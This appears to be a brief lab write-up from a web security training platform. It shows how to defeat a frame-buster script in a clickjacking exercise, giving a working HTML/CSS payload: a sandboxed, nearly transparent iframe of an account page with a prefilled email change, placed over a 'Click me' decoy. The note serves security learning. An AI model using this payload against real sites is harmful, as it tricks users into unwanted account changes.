Clickjacking with a frame buster script:

    -The website contains frame buster to counter the iframe attacks.
    -So to stop that attcks we use sandbox property in iframe to neutralize the frame buster.
    -sandbox="allow-forms" for neutralization
    -<style>
        #frame{
            position:relative;
            width:1000;
            height: 700;
            opacity:0.0001;
            z-index: 2;
        }
        #Div{
            position:absolute;
            top:465;
            left:62;
            z-index: 1;
        }
    </style>
    <div id="Div">Click me</div>
    <iframe src="https://0a87009a03a641d68180bb5a008900a6.web-security-academy.net/my-account?email=rombas@sat.ca" id="frame" sandbox="allow-forms"></iframe>
